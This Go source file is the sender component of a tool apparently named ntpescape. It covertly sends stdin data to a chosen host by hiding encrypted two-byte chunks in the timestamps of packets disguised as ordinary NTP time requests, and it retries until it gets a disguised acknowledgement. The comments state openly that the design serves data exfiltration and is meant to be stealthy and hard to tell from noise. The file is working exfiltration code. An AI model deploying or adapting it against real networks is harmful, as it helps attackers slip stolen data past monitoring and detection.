package send

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"

	"github.com/evallen/ntpescape/common"
)

var key = []byte{0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa}

const timeout = 5 * time.Second

func Main() {
	host := flag.String("h", "localhost:123", "host: host to send the NTP packets to")
	// infile := flag.String("f", "-", "file: file to exfiltrate data from ('-' for STDIN)")
	flag.Parse()

	err := sendFromStdin(host)
	if err != nil {
		log.Fatalln(err)
	}
}

// Send data from stdin to the given `host`. 
func sendFromStdin(host *string) error {
	inbuf := make([]byte, 1024)
	reader := bufio.NewReader(os.Stdin)

	for {
		n, err := reader.Read(inbuf)
		if err != nil {
			if err == io.EOF {
				break
			}
			return fmt.Errorf("error reading STDIN: %v", err)
		}

		inbuf = inbuf[:n]

		err = reliableSendBuffer(inbuf, host)
		if err != nil {
			return fmt.Errorf("error reliably sending buffer: %v", err)
		}

		inbuf = inbuf[:cap(inbuf)]
	}

	return nil
}

// Reliably send a buffer `buf` of bytes to a `host`. 
// 
// Splits the `buf` into two-byte message segments
// and reliably sends each one. 
func reliableSendBuffer(buf []byte, host *string) error {
	for i := 0; i < len(buf); i += 2 {
		var message uint16
		if i == len(buf)-1 {
			message = uint16(buf[i]) << 8
		} else {
			message = uint16(buf[i])<<8 | uint16(buf[i+1])
		}

		err := reliableSendMessage(message, host)
		if err != nil {
			return fmt.Errorf("error reliably sending message: %v", err)
		}
	}

	return nil
}

// Reliably send a 16-bit `message` to a `host`. 
//
// This function sends a packet with the `message` 
// and waits for a corresponding ACK response from the 
// server.
// 
// If it doesn't get one, it tries over and over again
// until the server eventually responds correctly.
func reliableSendMessage(message uint16, host *string) error {
	raddr, err := net.ResolveUDPAddr("udp", *host)
	if err != nil {
		return fmt.Errorf("failed resolving host %v: ", err)
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		return fmt.Errorf("failed to connect to %v: %v", *host, err)
	}
	defer conn.Close()

	result := false

	for !result {
		sentPacket, err := sendMessage(message, conn)
		if err != nil {
			log.Printf("error sending message: %v\n", err)
		}

		result, err = waitForAck(sentPacket, conn)
		if err != nil {
			log.Printf("error waiting for ACK: %v", err)
		}
	}

	return nil
}

// Send a message packet to the server.
//
// The message packet looks like a normal NTP client request asking for
// the current time, but has the given 16-bit `message` embedded in
// the bottom two bytes of the transmit timestamp.
//
// The message is encrypted to increase entropy and make it harder to distinguish
// from random noise.
//
// Returns the sent NTP packet (for use in verifying ACK packets later) and any
// error.
func sendMessage(message uint16, conn *net.UDPConn) (*common.NTPPacket, error) {
	packet := common.GenerateClientPkt()
	packet.PatchPacketEncrypted(message, key)

	if err := binary.Write(conn, binary.BigEndian, packet); err != nil {
		return &common.NTPPacket{},
			fmt.Errorf("failed sending packet %v to %v: %v", packet, conn.RemoteAddr(), err)
	}

	return packet, nil
}

// Wait for an ACK packet to come in from the NTP server to acknowledge
// the sent `packet`.
//
// An incoming packet is considered to have ACK'ed a previously transmitted
// `packet` if the incoming origin timestamp matches the transmit timestamp
// of the sent packet.
//
// This is standard for server responses to NTP client requests, and provides
// a convenient (and stealthy) way for us to know if the receiver got our message.
//
// Returns `result` = True if an ACK was sucessfully received, or False if not.
func waitForAck(packet *common.NTPPacket, conn *net.UDPConn) (result bool, err error) {
	// Read packet
	b := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(timeout))
	_, _, err = conn.ReadFromUDP(b)
	if err != nil {
		return false, fmt.Errorf("failed reading ACK from UDP: %v", err)
	}

	// Put into struct
	var response common.NTPPacket
	err = binary.Read(bytes.NewBuffer(b), binary.BigEndian, &response)
	if err != nil {
		return false, fmt.Errorf("failed reading ACK packet: %v", err)
	}

	// See if it's a valid ACK
	if response.OrigTimeSec == packet.TxTimeSec &&
		response.OrigTimeFrac == packet.TxTimeFrac {
		return true, nil
	}

	return false, nil
}
